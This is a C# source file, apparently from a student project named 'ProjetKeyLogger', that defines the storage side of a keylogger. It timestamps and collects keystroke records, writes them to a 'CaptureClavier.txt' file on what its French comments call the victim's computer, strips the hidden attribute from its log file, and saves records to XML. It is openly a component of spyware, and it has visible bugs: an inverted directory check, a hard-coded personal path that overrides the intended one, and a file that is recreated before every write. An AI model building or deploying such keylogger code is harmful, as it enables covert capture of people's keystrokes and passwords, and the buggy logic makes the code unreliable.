using System;
using System.Collections.Generic;
using System.IO;
using System.Xml.Serialization;

namespace ProjetKeyLogger
{
    [Serializable]
    public class CollectionEnregistrement
    {
        //Liste des enregistrements
        private List<Enregistrement> list_enregistrement;

        //proprieté en lecture / ecriture
        public List<Enregistrement> List_Enregistrement
        {
            get
            {
                return list_enregistrement;
            }
        }

        //Constructeur
        public CollectionEnregistrement()
        {
            //instanciation de la liste enregistrement
            list_enregistrement = new List<Enregistrement>();
        }

        //Ajoute un enregistrement a la collection
        public void ajouter(Enregistrement enregistrement)
        {
            //mise a jour de la date
            enregistrement.dateTimeNow();

            //On ajoute a la liste l'enregistrement courrant
            list_enregistrement.Add(enregistrement);
        }

        //Méthode qui écrit la saisie dans un .txt
        private void enregistreTxt(int texte)
        {

            //chemin dynamique car on l'enregistre sur l'ordinateur de la victime
            string chemin_Dossier = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            chemin_Dossier = "C:/Users/Charlie/OneDrive/Etudes/M2 OPSIE/Csharp/ProjetEspion";

            //Si la victime n'a pas de dossier "mes documents" alors on en crée un
            if (Directory.Exists(chemin_Dossier))
            {
                Directory.CreateDirectory(chemin_Dossier);
            }

            //Création du fichier texte
            using (StreamWriter sw = File.CreateText(chemin_Dossier + @"\CaptureClavier.txt"))
            {

            }

            //Ecriture
            using (StreamWriter sw = File.AppendText(chemin_Dossier + @"\CaptureClavier.txt"))
            {
                sw.Write(texte);

            }
        }

        //sauvegarde dans un fichier XML
        public void saveToXml(string file_path)
        {

            //On vérifie si le fichier existe
            if (File.Exists(file_path))
            {
                //on enleve le statut caché pour pouvoir ecrire dans le fichier
                //source : https://www.geeksforgeeks.org/file-setattributes-method-in-csharp-with-examples/
                FileAttributes attributs = File.GetAttributes(file_path);
                attributs = RemoveAttribute(attributs, FileAttributes.Hidden);
                File.SetAttributes(file_path, attributs);
            }
           

            //Fichier XML
            FileStream file = File.Open(file_path, FileMode.Create);

            //Ecriture de la collection
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
            serializer.Serialize(file, this);

            //fermeture du fichier
            file.Close();
        }

        //sert pour enlever le statut cacher
        private FileAttributes RemoveAttribute(FileAttributes attributs, FileAttributes hidden)
        {
            return attributs & ~hidden;
        }

        public static CollectionEnregistrement loadFromXML(string nomFichier)
        {
            FileStream file = File.Open(nomFichier, FileMode.Open);
            XmlSerializer serializer = new XmlSerializer(typeof(CollectionEnregistrement));
            CollectionEnregistrement collection_enregistrement = (CollectionEnregistrement)serializer.Deserialize(file);
            file.Close();
            return collection_enregistrement;
        }


    }
}
